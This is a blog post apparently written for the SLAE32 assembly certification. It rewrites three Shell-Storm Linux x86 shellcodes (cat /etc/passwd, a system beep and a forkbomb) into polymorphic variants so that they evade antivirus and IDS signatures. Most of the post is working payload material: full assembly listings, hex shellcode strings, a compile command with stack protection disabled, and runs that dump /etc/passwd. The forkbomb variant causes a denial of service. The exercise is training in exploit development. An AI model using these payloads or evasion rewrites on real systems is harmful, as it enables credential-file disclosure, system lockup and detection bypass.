---
title: "SLAE32 0x06: Polymorphic Shell-Storm Shellcode"
date: 2019-11-17
category: [SLAE32]
tags: [assembly, exploit development, polymorphic shellcode, linux, SLAE32]
header:
    teaser: "/assets/images/slae/polymorph.jpg"
---
Polymorphic shellcode can be described as any shellcode that performs the same function as an existing shellcode, but with different instructions. In a similar vein to encoded shellcode, polymorphic shellcode is most commonly used in an attempt to evade anti-virus software and intrusion detection systems.

Generally speaking, anti-virus software and intrusion detection systems (IDS) scan data for known patterns (signatures) that correspond to known malicious code or computer viruses. If an anti-virus software or IDS system detects such patterns, then the code will not be executed by the system. As a way to circumvent this, polymorphic shellcode can be used in place of the original shellcode with the hopes that the signature for the polymorphic shellcode is not in the signature database of the anti-virus or IDS software. 

The rest of this post will analyze three existing shellcodes taken from the Shell-Storm website. Using these shellcodes as a starting point, a polymorphic shellcode will be created through modification of the original shellcode. The changes made to each shellcode will be explained as part of the exercise.

## Objectives
Create 3 polymorphic shellcodes from 3 pre-existing Shell-Storm shellcodes;
1. Each polymorphic shellcode should not be longer than 150% of the pre-existing shellcode
2. Extra points for if the polymorphic shellcode is shorter than the pre-existing shellcode

## Shellcode I: /bin/cat /etc/passwd
### Shellcode I: Explanation
The first shellcode that will be examined and altered is `/bin/cat /etc/passwd`. This shellcode uses the `execve` system call to execute the command `/bin/cat /etc/passwd` on the system on which the shellcode is run. The `execve` system call has been explained in many previous posts and therefore will not be explained here.

The original Shell-Storm shellcode can be found [here](http://shell-storm.org/shellcode/files/shellcode-571.php).

### Shellcode I: Original Assembly & Shellcode
The assembly instructions for the unmodified `/bin/cat /etc/passwd` shellcode are shown below:

```nasm
global _start

section .text
_start:
    xor eax, eax 
    cdq 
    push edx 
    push dword 0x7461632f
    push dword 0x6e69622f
    mov ebx, esp 
    push edx 
    push dword 0x64777373
    push dword 0x61702f2f
    push dword 0x6374652f
    mov ecx, esp 
    mov al, 0xb 
    push edx 
    push ecx 
    push ebx 
    mov ecx, esp 
    int 0x80
```

After compiling and linking the assembly code above, the `bash` one-liner that has been used in previous posts can be used to generate the hexadecimal shellcode shown below. The original `/bin/cat /etc/passwd` shellcode is 43 bytes in length.

```shell
\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80
```

### Shellcode I: Original Demonstration
This shellcode can be demonstrated by placing the shellcode shown above in an `sc_test.c` file. The `sc_test.c` file used to test the shellcode here is the same `sc_test.c` shellcode that has been used in previous posts. After compiling `sc_test.c` using the `gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test` command, the binary can be executed. Upon execution, the program prints the contents of the `/etc/passwd` file to the terminal. A demonstration of this is shown below.

```shell
root@kali:~/workspace/SLAE/assignments/0x06# ./sc_test                                                                           
Shellcode Length: 43                                                                                                             
root:x:0:0:root:/root:/bin/bash                                                                                                  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                  
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                             
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                             
sync:x:4:65534:sync:/bin:/bin/sync                                                                                               
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                                                                  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                                  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                                                     
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                                                      
...                       
```

### Shellcode I: Morphed Assembly & Shellcode
The original assembly code has been modified and is shown in full below. Comments have been added to the assembly code to show where changes have been made. An explanation of these changes follows the code.

```nasm
global _start

section .text
_start:
    xor eax, eax 
    mul eax                     ; change #1
    push edx 
    push dword 0x7461632f
    push dword 0x6e69622f
    mov ebx, esp 
    push edx 
    jmp short jump_a            ; change #2

call_a:
    pop ecx                     ; change #3
    mov al, 0xb 
    push edx 
    push ecx 
    push ebx 
    mov ecx, esp 
    int 0x80

jump_a:
    call call_a
    db '/etc/passwd'
```

For the first change, in the original assembly code, an `XOR` instruction and a `CDQ` instruction were used at the beginning of the program to clear the necessary registers. In the modified shellcode, a `MUL EAX` instruction was used in place of `CDQ`. In this case, the `MUL EAX` instruction results in the `EAX` and the `EDX` registers being cleared. The `MUL` instruction was discussed in more detail in a previous post.

For the second change, the original shellcode used three `PUSH` instructions to store a string on the stack. Converting the pushed bytes to ASCII reveals that the string is `/etc//passwd`, as shown below.

```shell
>>> print('\x64\x77\x73\x73\x61\x70\x2f\x2f\x63\x74\x65\x2f')
dwssap//cte/
```

 In the modified shellcode, a 'JUMP-CALL-POP' technique is used to accomplish this task. In the modified program, the `JMP SHORT jump_a` instruction redirects execution to the `jump_a` label. At the `jump_a` label, a `CALL` instruction is used to store the memory address immediately following the `CALL` to the stack and to redirect execution to the `call_a` label. In this case, the memory address immediately following the `CALL` instruction contains the string `/etc/passwd` as defined by the `DB` instruction. 

For the third change, as execution flow continues at the `call_a` label, a `POP ECX` instruction is used in place of a `MOV ECX, ESP` instruction in the original assembly code. The functionality provided by these two different instructions accomplish the same task.

The shellcode resulting from the modified version of `/bin/cat /etc/passwd` is 46 bytes (3 bytes longer than the original shellcode) and is shown below.

```shell
\x31\xc0\xf7\xe0\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\xeb\x0a\x59\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80\xe8\xf1\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64
```

### Shellcode I: Morphed Demonstration
The modified shellcode can be tested in the same manner as the original shellcode. Once again, the `sc_test.c` program was used to test the shellcode. Upon compiling `sc_test.c` with the modified shellcode and executing `sc_test`, the contents of `/etc/passwd` is printed to the terminal as expected. A sample of the output is shown below.

```shell
root@kali:~/workspace/SLAE/assignments/0x06# ./sc_test                                                                           
Shellcode Length: 46                                                                                                             
root:x:0:0:root:/root:/bin/bash                                                                                                  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                  
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                             
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                             
sync:x:4:65534:sync:/bin:/bin/sync                                                                                               
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                                                                  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                                  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                                                     
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
...                         
```

## Shellcode II: System Beep
### Shellcode II: Explanation
The second shellcode that will be examined and altered is the 'System Beep' shellcode. This shellcode uses two system calls to complete the task of making the system on which the code is executed issue a low tone audible beep. The system calls used in this shellcode are `open` and `iotcl`. 

The original Shell-Storm shellcode can be found [here](http://shell-storm.org/shellcode/files/shellcode-60.php).

### Shellcode II: Original Assembly & Shellcode
The assembly instructions for the unmodified 'System Beep' shellcode are shown below:

```nasm
global _start

section .text
_start:
    push byte 5
    pop eax 
    cdq 
    push edx 
    push 0x30317974
    push 0x742f2f2f
    push 0x7665642f
    mov ebx, esp 
    mov ecx, edx 
    int 0x80
    mov ebx, eax 
    push byte 54
    pop eax 
    mov ecx, 4294948047
    not ecx 
    mov edx, 66729180
    int 0x80
```

After compiling and linking the assembly code above, the `bash` one-liner mentioned previously can be used to generate the hexadecimal shellcode shown below. The original 'System Beep' shellcode is 45 bytes in length.

```shell
\x6a\x05\x58\x99\x52\x68\x74\x79\x31\x30\x68\x2f\x2f\x2f\x74\x68\x2f\x64\x65\x76\x89\xe3\x89\xd1\xcd\x80\x89\xc3\x6a\x36\x58\xb9\xcf\xb4\xff\xff\xf7\xd1\xba\xdc\x34\xfa\x03\xcd\x80
```

### Shellcode II: Original Demonstration
The 'System Beep' shellcode can be tested in the same manner as outlined previously for the `/bin/cat /etc/passwd` shellcode. Once again, the `sc_test.c` file containing the shellcode shown above was compiled with the `gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test` command which compiles the `sc_test` binary. Running the `sc_test` binary that was compiled with the 'System Beep' shellcode from above results in the system producing an audible low-pitched 'beep'. The `sc_test` binary additionally prints the length of the shellcode, which is 45 bytes, as shown below. Note that this code results in a `Segmentation Fault` error.

```shell
root@kali:~/workspace/SLAE/assignments/0x06# ./sc_test 
Shellcode Length: 45
Segmentation fault
```

### Shellcode II: Morphed Assembly & Shellcode
The original assembly code has been modified and is shown in full below. Comments have been added to the assembly code to show where changes have been made. An explanation of these changes follows the code.

```nasm
global _start

section .text
_start:
    xor eax, eax                ; change #1
    mul ecx 
    mov cl, 5

loop_inc:                       ; change #2
    inc eax 
    loop loop_inc
    push edx 
    jmp short jump_a            ; change #3
   
call_a:
    pop ebx                     ; change #4
    int 0x80
    xchg ebx, eax               ; change #5
    push byte 54
    pop eax 
    mov ecx, 4294948047
    not ecx 
    mov edx, 66729180
    int 0x80

jump_a:
    call call_a
    db '/dev/tty10'
```

In a manner similar to the case outlined in the `/bin/cat /etc/passwd` assembly and shellcode, the first change to the 'System Beep' assembly code involves how the required registers are zereod out. In the modified shellcode, an `XOR EAX` instruction and a  `MUL ECX` instruction are used to clear the required registers. The `MUL` instruction was discussed in more detail in a previous post. In contrast to the original shellcode, the modified shellcode moves the value `5` into the `CL` register with the `MOV CL, 5` instruction.

The second change noted within the modified 'System Beep' assembly code involves how the value of `5` is placed in the `EAX` register for the `open` system call. In the modifed assembly code, a loop is used to increase the value in `EAX` from `0` to `5`. The `LOOP loop_inc` instruction will repeat the insructions between itself and the `loop_inc` label until the value in `ECX` is `0`. As the value `5` was moved into `CL` as mentioned previously, this will result in the `EAX` register containing the value `5` as the `LOOP` instruction completes. This method is in contrast to the much simpler method used in the original shellcode of pushing the value `5` to the stack and subsequently storing it in `EAX` with a `POP EAX` instruction. 

The third change involves the use of the 'JUMP-CALL-POP' technique. This technique is used in the same way as explained previously in the `/bin/cat /etc/passwd` example. In the modified program, the `JMP SHORT jump_a` instruction redirects execution to the `jump_a` label. At the `jump_a` label, a `CALL` instruction is used to store the memory address immediately following the `CALL` to the stack and to redirect execution to the `call_a` label. In this case, the memory address immediately following the `CALL` instruction contains the string `/dev/tty10` as defined by the `DB` instruction. 

The `/dev/tty10` value can be confirmed by examing the bytes pushed to the stack by the three concurrent `PUSH` instructions in the original assembly code, as shown below.

```shell
>>> print('\x30\x31\x79\x74\x74\x2f\x2f\x2f\x76\x65\x64\x2f')
01ytt///ved/
```

The fourth and fifth changes are simple changes. The fourth change uses a `POP EBX` instruction to store `ESP` in the `EBX` register instead of the `MOV EBX, ESP` instruction used n the original assembly code. The fifth change implements an `XCHG EBX, EAX` instruction instead of a 
`MOV EBX, EAX` command.

The shellcode resulting from the modified version of 'System Beep' is 48 bytes (3 bytes longer than the original shellcode) and is shown below.

```shell
\x31\xc0\xf7\xe1\xb1\x05\x40\xe2\xfd\x52\xeb\x15\x5b\xcd\x80\x93\x6a\x36\x58\xb9\xcf\xb4\xff\xff\xf7\xd1\xba\xdc\x34\xfa\x03\xcd
\x80\xe8\xe6\xff\xff\xff\x2f\x64\x65\x76\x2f\x74\x74\x79\x31\x30
```

### Shellcode II: Morphed Demonstration
The modified assembly code can be tested using the `sc_test.c` file once again. After compiling `sc_test.c`, the binary `sc_test` will produce the same low-pitched beep as the original shellcode. Interestingly enough, the modified shellcode does not result in a `Segmentation Fault` error as the original shellcode did.

```shell
root@kali:~/workspace/SLAE/assignments/0x06# ./sc_test 
Shellcode Length: 48

```

## Shellcode III: Forkbomb
### Shellcode III: Explanation
The third and final shellcode that will be analyzed and modified is the short, simple, yet highly effective 'Forkbomb' shellcode. Don't let the length and the simplicity of this shellcode fool you, for its effects are powerful. Just 7 bytes in length, the shellcode packs a powerful punch in the form of a denial of service when executed. The 'Forkbomb' shellcode utilizes the `fork` system call to accomplish this task. 

From `man fork`, the `fork` function creates a new process by duplicating the calling process. The denial of service shellcode loops over the `fork` system call indefinitely, until the system on which the code is run is depleted of memory.

The original Shell-Storm shellcode can be found [here](http://shell-storm.org/shellcode/files/shellcode-214.php).

### Shellcode III: Original Assembly & Shellcode
The assembly instructions for the unmodified 'Forkbomb' shellcode are shown below:

```nasm
global _start

section .text
_start:
    push byte 2
    pop eax
    int 0x80
    jmp short _start
```

After compiling and linking the assembly code above, the `bash` one-liner that has been mentioned previously can be used to generate the hexadecimal shellcode shown below. The original 'Forkbomb' shellcode is 7 bytes in length.

```shell
\x6a\x02\x58\xcd\x80\xeb\xf9
```
### Shellcode III: Original Demonstration
Note: Run this code at your own risk!

The 'Forkbomb' shellcode is difficult to demonstrate, as after running it, the system on which it is executed will very quickly (almost immediately) lock up. The system or virtual machine must be rebooted after executing the shellcode.

### Shellcode III: Morphed Assembly & Shellcode
The original assembly code has been modified and is shown in full below. Comments have been added to the assembly code to show where changes have been made. An explanation of these changes follows the code.

```nasm
global _start

section .text
_start:
    xor eax, eax                ; change #1
    mov al, 1                   ; change #2
    inc eax                     ; change #3
    int 0x80            
    jmp _start                  ; change #4
```

The first change involves the use of an `XOR EAX, EAX` instruction. A similar instruction is not used in the original shellcode, as it is not necessary. The second change is the use of a `MOV AL, 1` instruction. This instruction is used to set up `EAX` for the upcoming `fork` system call. The `INC EAX` instruction is the third change and serves to complete the set up of the `EAX` register for the `fork` system call. After the `MOV AL, 1` and the `INC EAX` instructions, the `EAX` register holds the value `2` which specifies the `fork` system call in the `unistd_32.h` file mentioned in previous posts. Finally, the `jmp _start` instruction is used in place of a `jmp short _start` instruction in the original shellcode.

The shellcode resulting from the modified version of 'Forkbomb' is 9 bytes (2 bytes longer than the original shellcode) and is shown below. Note that only three of the bytes present in the original shellcode are present in the modified shellcode.

```shell
\x31\xc0\xb0\x01\x40\xcd\x80\xeb\xf8
```

### Shellcode III: Morphed Demonstration
As mentioned before, this shellcode should be tested at your own risk as it will lock up a system upon execution. The modified shellcode from above can be succsfully executed using `sc_test.c` and `sc_test` as described previously.

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

